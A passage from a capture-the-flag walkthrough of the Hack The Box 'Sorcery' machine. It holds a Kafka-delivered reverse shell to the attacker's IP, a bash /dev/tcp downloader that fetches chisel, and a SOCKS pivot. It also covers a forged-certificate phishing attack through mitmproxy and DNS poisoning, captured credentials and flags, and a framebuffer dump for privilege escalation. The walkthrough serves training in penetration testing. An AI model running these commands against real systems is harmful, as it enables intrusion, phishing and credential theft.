    packet = build_kafka_produce_request(TOPIC_NAME, REVERSE_SHELL.encode())
    hex_output = binascii.hexlify(packet).decode()
    print(hex_output)

```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ python3 payload.py 
00000076000000000000002a000364626700010000271000000001000675706461746500000001000000000000004b00000000000000000000003fe65a99f60000ffffffff0000003162617368202d6320277368202d69203e26202f6465762f7463702f31302e31302e31362e33332f3434343420303e263127
```

We specified the host `kafka` and the port `9092`, clicked on `Add data field`, entered our `payload` and received a `callback` on our listener.

![](images/2025-06-15_21-05_443_debug_send_payload.png)

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.33] from (UNKNOWN) [10.129.50.43] 42528
sh: 0: can't access tty; job control turned off
$
```

Then we performed a bit of `shell stabilization` and moved on.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

user@7bfb70ee5b9c:/$ 
user@7bfb70ee5b9c:/$ export XTERM=xterm
user@7bfb70ee5b9c:/$
```

## Enumeration (user)

As our first step we checked what was available in terms of permissions, other users and so on. We already knew that we are in a `Docker Container` so we aimed for either `credentials` or `functionality` we could abuse.

```shell
user@7bfb70ee5b9c:/$ id
uid=1001(user) gid=1001(user) groups=1001(user)
```

```shell
user@7bfb70ee5b9c:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
user:x:1001:1001::/home/user:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

```shell
user@7bfb70ee5b9c:/$ pwd
/app
```

```shell
user@7bfb70ee5b9c:/$ ls
dns
```

```shell
user@7bfb70ee5b9c:/$ ls -la /
total 580
drwxr-xr-x   1 root   root      4096 Apr 28 12:07 .
drwxr-xr-x   1 root   root      4096 Apr 28 12:07 ..
-rwxr-xr-x   1 root   root         0 Oct 30  2024 .dockerenv
drwxr-xr-x   1 root   root      4096 Apr 28 12:07 app
lrwxrwxrwx   1 root   root         7 Sep  4  2024 bin -> usr/bin
drwxr-xr-x   2 root   root      4096 Aug 14  2024 boot
drwxr-xr-x   5 root   root       340 Jun 15 16:50 dev
drwxr-xr-x   1 user   user      4096 Apr 28 12:07 dns
-rwxr-xr-x   1 root   root       117 Oct 30  2024 docker-entrypoint.sh
drwxr-xr-x   1 root   root      4096 Apr 28 12:07 etc
drwxr-xr-x   1 root   root      4096 Oct 31  2024 home
lrwxrwxrwx   1 root   root         7 Sep  4  2024 lib -> usr/lib
lrwxrwxrwx   1 root   root         9 Sep  4  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root   root      4096 Sep  4  2024 media
drwxr-xr-x   2 root   root      4096 Sep  4  2024 mnt
drwxr-xr-x   2 root   root      4096 Sep  4  2024 opt
dr-xr-xr-x 405 nobody nogroup      0 Jun 15 16:50 proc
drwx------   2 root   root      4096 Sep  4  2024 root
drwxr-xr-x   1 root   root      4096 Oct 31  2024 run
lrwxrwxrwx   1 root   root         8 Sep  4  2024 sbin -> usr/sbin
drwxr-xr-x   2 root   root      4096 Sep  4  2024 srv
dr-xr-xr-x  13 nobody nogroup      0 Jun 15 16:50 sys
drwxrwxrwt   1 root   root      4096 Jun 15 16:50 tmp
drwxr-xr-x   1 root   root      4096 Sep  4  2024 usr
drwxr-xr-x   1 root   root      4096 Sep  4  2024 var
-rwxr-xr-x   1 root   root    506040 Sep 27  2023 wait
```

We quickly noticed that the container was pretty much locked down in terms of available utility like `ip`, `ps`, `netstat` etc.

```shell
user@7bfb70ee5b9c:/$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.19.0.6      7bfb70ee5b9c
```

Our current directory contained the files we saw in the `DNS` section of the web application and we had `rwx` permissions set on the whole directory.

```shell
user@7bfb70ee5b9c:/dns$ ls -la
total 24
drwxr-xr-x 1 user user 4096 Apr 28 12:07 .
drwxr-xr-x 1 root root 4096 Apr 28 12:07 ..
-rwxr-xr-x 1 root root  364 Aug 31  2024 convert.sh
-rwxr--r-- 1 user user  598 Jun 15 18:41 entries
-rw-r--r-- 1 root root  598 Jun 15 16:50 hosts
```

```shell
doneuser@7bfb70ee5b9c:/dns$ cat entries
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
```

```shell
user@7bfb70ee5b9c:/dns$ cat hosts
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
127.0.0.1 git.sorcery.htb
```

### LinPEAS Execution

To get a nice summary of the system we ran `LinPEAS` which showed us what we already expected. We were able to change the configuration of `DNS` inside the container.

- [https://github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)

```shell
<--- CUT FOR BREVITY --->
╔══════════╣ D-Bus Configuration Files
Analyzing /etc/dbus-1/system.d/dnsmasq.conf:                                                                                                                                                                                                
  └─(Weak user policy found)
     └─         <policy user="dnsmasq">
<--- CUT FOR BREVITY --->
```

```shell
<--- CUT FOR BREVITY --->
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
══╣ Active tcp Ports (from /proc/net/tcp)                                                                                                                                                                                                   
Proto  Recv-Q  Send-Q  Local Address          Foreign Address        State       PID/Program name                                                                                                                                           
--------------------------------------------------------------------------------
tcp    00:00000000 00000000:00000000 127.0.0.11:36749      0.0.0.0:0             LISTEN       /
tcp    00:00000000 00000000:00000000 0.0.0.0:53            0.0.0.0:0             LISTEN       10/dnsmasq
<--- CUT FOR BREVITY --->
```

```shell
<--- CUT FOR BREVITY --->
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
/dev/full                                                                                                                                                                                                                                   
/dev/mqueue
/dev/null
/dev/random
/dev/shm
#)You_can_write_even_more_files_inside_last_directory

/dns
/dns/entries
/etc/supervisor/supervisord.conf
/home/user
/home/user/chisel
/run/lock
/tmp
/tmp/chisel
/tmp/linpeas.sh
/var/tmp
<--- CUT FOR BREVITY --->
```

### DEEPCE Exection

Just to rule it out we fired up `DEEPCE` for a quick check of the `Container`. The `IP address` of the container indicated that there could be more systems and also just the fact that we were pretty much nailed down service wise.

```shell
user@7bfb70ee5b9c:/tmp$ ./deepce.sh

                      ##         .
                ## ## ##        ==                                               
             ## ## ## ##       ===                                               
         /"""""""""""""""""\___/ ===                                             
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~                                      
         \______ X           __/
           \    \         __/
          __\____\_______/
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines                                                                                                                                                                                                                     

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window                                                                                                                                                                             
See https://stealthcopter.github.io/deepce                                                                                                                                                                                                  

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... user
[+] Groups .................. user
[+] Sudo .................... sudo not found
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ 7bfb70ee5b9c
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.19.0.6 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.19.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 6.8.0-60-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7513 32-Core Processor
[+] Useful tools installed .. Yes
/usr/bin/nslookup
/usr/bin/host                                                                                                                                                                                                                               
/usr/bin/hostname                                                                                                                                                                                                                           
/usr/bin/dig                                                                                                                                                                                                                                
/usr/bin/python3                                                                                                                                                                                                                            
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh: 0000000000000000
CapPrm: 0000000000000000                                                                                                                                                                                                                    
CapEff: 0000000000000000                                                                                                                                                                                                                    
CapBnd: 00000000a80425fb                                                                                                                                                                                                                    
CapAmb: 0000000000000000                                                                                                                                                                                                                    
> This can be decoded with: "capsh --decode=0000000000000000"
[+] SSHD Service ............ No
[+] Privileged Mode ......... Unknown
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/random /dev/random rw,nosuid,relatime master:2 - devtmpfs udev rw,size=4001920k,nr_inodes=1000480,mode=755,inode64
/full /dev/full rw,nosuid,relatime master:2 - devtmpfs udev rw,size=4001920k,nr_inodes=1000480,mode=755,inode64                                                                                                                             
/tty /dev/tty rw,nosuid,relatime master:2 - devtmpfs udev rw,size=4001920k,nr_inodes=1000480,mode=755,inode64                                                                                                                               
/zero /dev/zero rw,nosuid,relatime master:2 - devtmpfs udev rw,size=4001920k,nr_inodes=1000480,mode=755,inode64                                                                                                                             
/urandom /dev/urandom rw,nosuid,relatime master:2 - devtmpfs udev rw,size=4001920k,nr_inodes=1000480,mode=755,inode64                                                                                                                       
[+] Possible host usernames ...  
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxr-xr-x 1 root root  364 Aug 31  2024 /dns/convert.sh
-rwxr-xr-x 1 root root  117 Oct 30  2024 /docker-entrypoint.sh                                                                                                                                                                              
-rwxr-xr-x 1 root root  117 Oct 30  2024 /docker-entrypoint.sh                                                                                                                                                                              
-rwxr-xr-x 1 user user  39K Jun 15 19:53 /tmp/deepce.sh                                                                                                                                                                                     
-rwxr-xr-x 1 user user 933K Jun 15 19:46 /tmp/linpeas.sh                                                                                                                                                                                    
[+] Interesting files in root ........... Yes
/docker-entrypoint.sh
/wait                                                                                                                                                                                                                                       
[+] Passwords in common files ........... No
[+] Home directories .................... total 4.0K
drwxr-xr-x 1 user user 4.0K Jun 15 19:31 user                                                                                                                                                                                               
[+] Hashes in shadow file ............... Not readable
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further                                                                                                                                                                                         

Could not ping sweep, requires nmap or ping to be executable
==============================================================================================
```

### Enumeration using nslookup

To get the `IP address` of the other systems we used `nslookup` because we knew the names already from the `Repository` and the `Docker` configuration file.

```shell
user@7bfb70ee5b9c:/tmp$ nslookup                                
> ftp
Server:  127.0.0.11
Address: 127.0.0.11#53

Non-authoritative answer:
Name:   ftp
Address: 172.19.0.2
```

```shell
user@7bfb70ee5b9c:/tmp$ nslookup
> mail
Server:  127.0.0.11
Address: 127.0.0.11#53

Non-authoritative answer:
Name:   mail
Address: 172.19.0.10
> exit
```

## Pivoting

### Transfer Chisel

The box was not joking when it came to the absence of useful tools like `wget` or `curl`. Therefore we switched to a `Bash` version of `curl` in order to get `Chisel` inside the container.

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```shell
user@7bfb70ee5b9c:/tmp$ function __curl() {
>   read proto server path <<<$(echo ${1//// })
>   DOC=/${path// //}
>   HOST=${server//:*}
>   PORT=${server//*:}
>   [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
> 
>   exec 3<>/dev/tcp/${HOST}/$PORT
>   echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
>   (while read line; do
>    [[ "$line" == $'\r' ]] && break
>   done && cat) <&3
>   exec 3>&-
> }
```

```shell
user@7bfb70ee5b9c:/tmp$ __curl http://10.10.16.33/chisel > chisel
```

```shell
user@7bfb70ee5b9c:/tmp$ ls -la
total 8468
drwxrwxrwt 1 root root    4096 Jun 15 19:36 .
drwxr-xr-x 1 root root    4096 Apr 28 12:07 ..
-rw-r--r-- 1 user user 8654848 Jun 15 19:36 chisel
-rw------- 1 root root       0 Jun 15 16:50 fatalexit-stderr---supervisor-csg1c7r9.log
-rw------- 1 root root       6 Jun 15 16:50 fatalexit-stdout---supervisor-sa8mhcoa.log
-rw-r--r-- 1 root root       2 Jun 15 16:50 supervisord.pid
```

### Building Reverse SOCKS Tunnel

Then we prepared our `Reverse SOCKS Tunnel` in order to `pivot` to the other systems using `proxychains`.

```shell
user@7bfb70ee5b9c:/tmp$ chmod +x chisel
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/serve]
└─$ ./chisel server -p 9002 -reverse -v 
2025/06/15 21:38:06 server: Reverse tunnelling enabled
2025/06/15 21:38:06 server: Fingerprint WU7DiNiU69YN849iZ73b9XGsCNpstNj2lMKjR47MZ5k=
2025/06/15 21:38:06 server: Listening on http://0.0.0.0:9002
```

```shell
user@7bfb70ee5b9c:/tmp$ ./chisel client 10.10.16.33:9002 R:socks
2025/06/15 19:38:39 client: Connecting to ws://10.10.16.33:9002
2025/06/15 19:38:40 client: Connected (Latency 15.153677ms)
```

## FTP Enumeration

From the `Blod` earlier we knew that the `FTP Server` stored the `Certificate` and `Key` for the `RootCA` which we needed to setup another `Phishing Campaign` against `tom_summers`.

We connected to the `FTP Server` using `proxychains` and used `anonymous authentication` to get access to the files.

| Username  | Password  |
| --------- | --------- |
| anonymous | anonymous |

```shell
┌──(kali㉿kali)-[~]
└─$ proxychains ftp anonymous@172.19.0.2                 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.2:21  ...  OK
Connected to 172.19.0.2.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```shell
ftp> ls
229 Entering Extended Passive Mode (|||21106|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.2:21106  ...  OK
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Oct 31  2024 pub
```

```shell
ftp> cd pub
250 Directory successfully changed.
```

```shell
ftp> ls
229 Entering Extended Passive Mode (|||21100|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.2:21100  ...  OK
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1826 Oct 31  2024 RootCA.crt
-rw-r--r--    1 ftp      ftp          3434 Oct 31  2024 RootCA.key
```

```shell
ftp> get RootCA.crt
local: RootCA.crt remote: RootCA.crt
229 Entering Extended Passive Mode (|||21108|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.2:21108  ...  OK
150 Opening BINARY mode data connection for RootCA.crt (1826 bytes).
```

```shell
ftp> get RootCA.key
local: RootCA.key remote: RootCA.key
229 Entering Extended Passive Mode (|||21105|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.2:21105  ...  OK
150 Opening BINARY mode data connection for RootCA.key (3434 bytes).
```

## Privilege Escalation to tom_summers

### Phishing

With the prerequisites out of the way we started preparing the `Phishing Attack` against `tom_summers`.

#### Generate Certificates

First we needed to generate a valid `Certificate` using the `Certificate` and `Key` of the `RootCA` for signing it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ openssl genrsa -out foobar.sorcery.htb.key 2048
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ openssl req -new -key foobar.sorcery.htb.key -out foobar.sorcery.htb.csr -subj "/CN=foobar.sorcery.htb"
```

The `RootCA.key` required a password and we just tried `password` 🤷 I guess we should have cracked it using `John the Ripper` or `hashcat` but whatever.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ openssl x509 -req -in foobar.sorcery.htb.csr -CA RootCA.crt -CAkey RootCA.key -CAcreateserial -out foobar.sorcery.htb.crt -days 365
Certificate request self-signature ok
subject=CN=foobar.sorcery.htb
Enter pass phrase for RootCA.key:
```

| Password |
| -------- |
| password |

As last step we merged our `Key` and `Certificate` to a `.pem` file.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ cat foobar.sorcery.htb.key foobar.sorcery.htb.crt > foobar.sorcery.htb.pem
```

#### Setting um MITMProxy

At this point we could have created a complete fake `Gitea` page but the easiest way was to use `MITMProxy` providing the `Certificate (foobar.sorvery.htb.pem)` to see if `tom_summers` would just send his credentials anyways.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ mitmproxy --mode reverse:https://git.sorcery.htb --certs foobar.sorcery.htb.pem --save-stream-file output.raw -k -p 443
```

#### Adding DNS Entry

We also needed to prepare a `DNS entry` which pointed to our local machine, running `MITMProxy`.

```shell
user@7bfb70ee5b9c:/tmp$ echo "10.10.16.33 foobar.sorcery.htb" >> /dns/hosts-user
```

```shell
user@7bfb70ee5b9c:/tmp$ killall -HUP dnsmasq
```

#### Sending Phishing Mail

And finally we used `Swaks` to send the `Phishing Email` containing a link for the user to click on.

```shell
┌──(kali㉿kali)-[~]
└─$ proxychains -q swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data "Subject: Hi Tom\n\nHi Tom,\n\nClick: https://foobar.sorcery.htb/user/login\n"
=== Trying 172.19.0.10:1025...
=== Connected to 172.19.0.10.
<-  220 mailhog.example ESMTP MailHog
 -> EHLO kali
<-  250-Hello kali
<-  250-PIPELINING
<-  250 AUTH PLAIN
 -> MAIL FROM:<nicole_sullivan@sorcery.htb>
<-  250 Sender nicole_sullivan@sorcery.htb ok
 -> RCPT TO:<tom_summers@sorcery.htb>
<-  250 Recipient tom_summers@sorcery.htb ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Subject: Hi Tom
 -> 
 -> Hi Tom,
 -> 
 -> Click: https://foobar.sorcery.htb/user/login
 -> 
 -> .
<-  250 Ok: queued as 5LkOUfXERNfW7hIqhvtTkc69EYdJeKZ8aM8fdW8KKRA=@mailhog.example
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

#### Receiving Traffic

After a few seconds we received some traffic containing a `POST Request`.

![](images/2025-06-15_22-26_mitmproxy_traffic.png)

And the `POST Request` contained the `username` and `password` of `tom_summers` which finally granted us access to the `main system` via `SSH`.

![](images/2025-06-15_22-24_mitmproxy_password.png)

| Username    | Password         |
| ----------- | ---------------- |
| tom_summers | jNsMKQ6k2.XDMPu. |

```shell
┌──(kali㉿kali)-[~]
└─$ ssh tom_summers@10.129.50.43
The authenticity of host '10.129.50.43 (10.129.50.43)' can't be established.
ED25519 key fingerprint is SHA256:Nshm+HLprf4CSB15aD8bc/lzqdKMitLi34sS1ZUlBog.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.50.43' (ED25519) to the list of known hosts.
(tom_summers@10.129.50.43) Password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jun 15 20:28:31 2025 from 10.10.16.33
tom_summers@main:~$
```

## user.txt

This was a hard earned `user.txt`.

```shell
tom_summers@main:~$ cat user.txt
d2593caf52edcbb9cff3137f7500dc22
```

## Enumeration (tom_summers)

As in good old fashion we repeated the usual steps of enumeration for `tom_summers` and found two more `users`.

```shell
tom_summers@main:~$ id
uid=2001(tom_summers) gid=2001(tom_summers) groups=2001(tom_summers)
```

```shell
tom_summers@main:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1001:1001::/home/vagrant:/usr/bin/bash
_chrony:x:105:104:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sssd:x:106:105:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
dockremap:x:107:106::/nonexistent:/bin/false
tom_summers:x:2001:2001::/home/tom_summers:/usr/bin/bash
tom_summers_admin:x:2002:2002::/home/tom_summers_admin:/usr/bin/bash
rebecca_smith:x:2003:2003::/home/rebecca_smith:/usr/bin/bash
_laurel:x:999:988::/var/log/laurel:/bin/false
```

| Username          |
| ----------------- |
| tom_summers_admin |
| rebecca_smith     |

```shell
tom_summers@main:~$ sudo -l
[sudo] password for tom_summers: 
Sorry, user tom_summers may not run sudo on localhost.
```

```shell
tom_summers@main:~$ ls -la
total 16
drwxr-x--- 3 tom_summers tom_summers 4096 Jun 14 22:44 .
drwxr-xr-x 7 root        root        4096 Oct 31  2024 ..
lrwxrwxrwx 1 root        root           9 Oct 30  2024 .bash_history -> /dev/null
drwx------ 2 tom_summers tom_summers 4096 Mar 19 15:26 .cache
-rw-r----- 1 root        tom_summers   33 Jun 15 16:49 user.txt
```

```shell
tom_summers@main:~$ ss -tulpn
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   
udp                     UNCONN                   0                        0                                              127.0.0.1:323                                             0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                              127.0.0.1:464                                             0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:58953                                           0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                             127.0.0.54:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                              127.0.0.1:88                                              0.0.0.0:*                                                
udp                     UNCONN                   0                        0                                                  [::1]:323                                                [::]:*                                                
tcp                     LISTEN                   0                        4096                                          127.0.0.54:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:636                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:5000                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:88                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:464                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                           127.0.0.1:389                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                             0.0.0.0:443                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*                                                
tcp                     LISTEN                   0                        4096                                                [::]:443                                                [::]:*                                                
tcp                     LISTEN                   0                        4096                                                   *:22                                                    *:*
```

## Privilege Escalation to tom_summers_admin

### LinPEAS Execution

After one more run of `LinPEAS` we found something interesting. There was a `xvfb session` for `tom_summers_admin`.

```shell
<--- CUT FOR BREVITY --->
tom_sum+    1439  0.0  0.7 227012 60356 ?        S    16:48   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
<--- CUT FOR BREVITY --->
```

```shell
tom_summers@main:~$ ls -l /xorg/xvfb
total 516
-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Jun 15 16:48 Xvfb_screen0
```

### Credential Retrieval through xvfb

Next we dumped the content of the session into a raw file and verified it's stats before we downloaded it to our local machine. And the reason for that was once more the absence of tools we needed like `truncate`.

```shell
tom_summers@main:/tmp$ cp /xorg/xvfb/Xvfb_screen0 /tmp/admin_fb.raw
```

```shell
tom_summers@main:/tmp$ stat -c %s /xorg/xvfb/Xvfb_screen0
527520
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ scp tom_summers@10.129.50.43:/tmp/admin_fb.raw .
(tom_summers@10.129.50.43) Password: 
admin_fb.raw                                                                                                                                                                                              100%  515KB   2.2MB/s   00:00
```

On our local machine we verified once more the stats of the file to make sure nothing got lost in transit and used `truncate` to prepare the file for reassembling.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ stat -c %s admin_fb.raw  
527520
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ truncate -s 524288 admin_fb.raw
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Sorcery/files]
└─$ convert -depth 8 -size 512x256 rgba:admin_fb.raw screen.png
```

